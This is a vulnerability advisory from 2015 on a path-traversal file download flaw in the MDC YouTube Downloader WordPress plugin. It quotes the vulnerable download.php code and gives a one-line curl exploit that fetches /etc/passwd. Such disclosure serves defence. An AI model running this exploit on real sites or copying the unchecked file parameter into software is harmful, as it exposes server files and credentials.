Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-01
Vendor Notified: 2015-07-01, removed vulnerable code.
Vendor Contact: n.mukto@gmail.com
Description: MDC YouTube Downloader allows visitors to download YouTube videos directly from your WordPress site.
Vulnerability:
The code in mdc-youtube-downloader/includes/download.php doesn&#039;t restrict access to the local file system allowing sensitive files to be
downloaded:

$file_name = $_GET[&#039;file&#039;];

// make sure it&#039;s a file before doing anything!
if(is_file($file_name)) {
.
.
.
 switch(strtolower(substr(strrchr($file_name, &#039;.&#039;), 1))) {
                case &#039;pdf&#039;: $mime = &#039;application/pdf&#039;; break;
                case &#039;zip&#039;: $mime = &#039;application/zip&#039;; break;
                case &#039;jpeg&#039;:
                case &#039;jpg&#039;: $mime = &#039;image/jpg&#039;; break;
                default: $mime = &#039;application/force-download&#039;;
        }
        header(&#039;Pragma: public&#039;);       // required
        header(&#039;Expires: 0&#039;);           // no cache
        header(&#039;Last-Modified: &#039;.gmdate (&#039;D, d M Y H:i:s&#039;, filemtime ($file_name)).&#039; GMT&#039;);
        header(&#039;Cache-Control: private&#039;,false);
        header(&#039;Content-Type: &#039;.$mime);
        header(&#039;Content-Disposition: attachment; filename="&#039;.basename($file_name).&#039;"&#039;);
        header(&#039;Content-Transfer-Encoding: binary&#039;);
        header(&#039;Content-Length: &#039;.filesize($file_name));        // provide file size
        header(&#039;Connection: close&#039;);
        readfile($file_name);           // push it out
        exit();

CVEID: Requested, TBD.
OSVDB: TBD.
Exploit Code:
  â€¢ $ curl http://www.example.com/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd

